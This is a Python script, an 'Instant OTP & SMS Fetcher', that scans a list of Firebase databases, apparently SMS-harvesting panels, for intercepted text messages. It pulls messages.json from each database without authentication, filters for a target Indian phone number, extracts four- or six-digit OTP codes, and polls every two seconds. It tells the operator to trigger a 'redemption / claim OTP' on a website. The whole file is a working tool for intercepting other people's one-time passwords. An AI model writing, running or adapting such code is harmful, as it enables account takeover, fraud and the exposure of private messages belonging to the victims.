#!/usr/bin/env python3
"""
Cremica / Firebase Instant OTP & SMS Fetcher.
Scans all 69 Firebase panels in parallel to retrieve and monitor live OTPs for any phone number.
Usage:
    python otp_fetcher.py 7208360119
    OR just run: python otp_fetcher.py
"""

import sys
import os
import re
import time
import requests
import base64
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Fix Windows console UTF-8 output encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

PANELS_FILE = "panels.txt"

def parse_firebase_link(link: str):
    if not link:
        return None
    link = link.strip()
    if not link.startswith(("http://", "https://")):
        link = "https://" + link

    parsed = urlparse(link)
    qs = parse_qs(parsed.query)
    encoded_s = qs.get("s", [None])[0]
    if encoded_s:
        try:
            encoded_clean = encoded_s + "=" * (-len(encoded_s) % 4)
            decoded = base64.b64decode(encoded_clean).decode("utf-8", errors="ignore").split("|")[0].strip()
            if "firebaseio.com" in decoded or "firebasedatabase.app" in decoded:
                if not decoded.startswith(("http://", "https://")):
                    decoded = "https://" + decoded
                return decoded.rstrip("/") + "/"
        except Exception:
            pass

    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return base_url.rstrip("/") + "/"

    return None

def load_panel_urls():
    urls = []
    if os.path.exists(PANELS_FILE):
        with open(PANELS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_firebase_link(line)
                if p:
                    urls.append(p)
    return urls

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "application/json"
}

def scan_panel_for_number(panel_url, target_phone):
    messages_found = []
    try:
        url = panel_url.rstrip("/") + "/messages.json"
        resp = requests.get(url, headers=headers, timeout=6)
        if resp.status_code == 200:
            data = resp.json() or {}
            if isinstance(data, dict):
                for cid, device_msgs in data.items():
                    if not isinstance(device_msgs, dict):
                        continue

                    # Check if target phone matches device messages
                    phone_matched = False
                    for m in device_msgs.values():
                        if isinstance(m, dict):
                            t = str(m.get("body") or m.get("message") or m.get("text") or "")
                            if target_phone in t:
                                phone_matched = True
                                break

                    if phone_matched:
                        for mid, mdata in device_msgs.items():
                            if not isinstance(mdata, dict):
                                continue
                            body = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")
                            if not body:
                                continue
                            sender = str(mdata.get("sender") or mdata.get("address") or mdata.get("from") or "Unknown")
                            ts_str = "Unknown"
                            ts_val = 0
                            try:
                                ts_val = int(mid) / 1000
                                ts_str = datetime.fromtimestamp(ts_val).strftime("%Y-%m-%d %H:%M:%S")
                            except Exception:
                                pass

                            otp_match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
                            otp = otp_match.group(1) if otp_match else "N/A"

                            messages_found.append({
                                "msg_id": mid,
                                "sender": sender,
                                "body": body,
                                "otp": otp,
                                "time": ts_str,
                                "ts_val": ts_val,
                                "panel": panel_url
                            })
    except Exception:
        pass
    return messages_found

def get_all_messages_for_phone(panel_urls, target_phone, max_workers=25):
    all_msgs = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(scan_panel_for_number, u, target_phone) for u in panel_urls]
        for f in as_completed(futures):
            all_msgs.extend(f.result())

    # Sort descending by timestamp / msg_id
    all_msgs.sort(key=lambda x: (x["ts_val"], str(x["msg_id"])), reverse=True)
    return all_msgs

def fetch_and_monitor(target_phone):
    panel_urls = load_panel_urls()
    if not panel_urls:
        print("❌ No panel URLs found in panels.txt!")
        return

    print("=" * 65)
    print(f"📱 INSTANT OTP & SMS FETCHER - Target: {target_phone}")
    print("=" * 65)
    print(f"🔄 Scanning {len(panel_urls)} Firebase panels in parallel...")

    messages = get_all_messages_for_phone(panel_urls, target_phone)

    print("\n" + "=" * 65)
    print(f"📩 RECENT MESSAGES FOR {target_phone} ({len(messages)} found):")
    print("=" * 65)

    seen_ids = set()
    if messages:
        for idx, m in enumerate(messages[:10], 1):
            seen_ids.add(m["msg_id"])
            print(f"{idx:02d}. [OTP: {m['otp']}] | Time: {m['time']} | Sender: {m['sender']}")
            print(f"    Message: {m['body']}")
            print(f"    Panel: {m['panel']}")
            print("-" * 65)
    else:
        print("ℹ️ No previous messages found for this number.")

    print("\n🟢 LIVE MONITORING MODE ACTIVATED! Listening for new incoming OTPs...")
    print("👉 Trigger your redemption / claim OTP now on the website.")
    print("Press Ctrl+C to stop.\n")

    try:
        while True:
            time.sleep(2)
            new_messages = get_all_messages_for_phone(panel_urls, target_phone)
            for m in new_messages:
                if m["msg_id"] not in seen_ids:
                    seen_ids.add(m["msg_id"])
                    print("=" * 65)
                    print(f"🔥 NEW INCOMING OTP RECEIVED! 🔥")
                    print(f"🔑 OTP CODE:  >>>>  {m['otp']}  <<<<")
                    print(f"⏰ Time: {m['time']} | Sender: {m['sender']}")
                    print(f"💬 Message: {m['body']}")
                    print("=" * 65 + "\n")
    except KeyboardInterrupt:
        print("\nStopped monitoring.")

def main():
    if len(sys.argv) >= 2:
        phone = sys.argv[1].strip()
    else:
        phone = input("\nEnter mobile number to fetch OTPs (e.g. 7208360119): ").strip()

    clean_phone = "".join(filter(str.isdigit, phone))
    if len(clean_phone) > 10 and clean_phone.startswith("91"):
        clean_phone = clean_phone[2:]

    if len(clean_phone) != 10:
        print("❌ Invalid 10-digit Indian phone number!")
        return

    fetch_and_monitor(clean_phone)

if __name__ == "__main__":
    main()
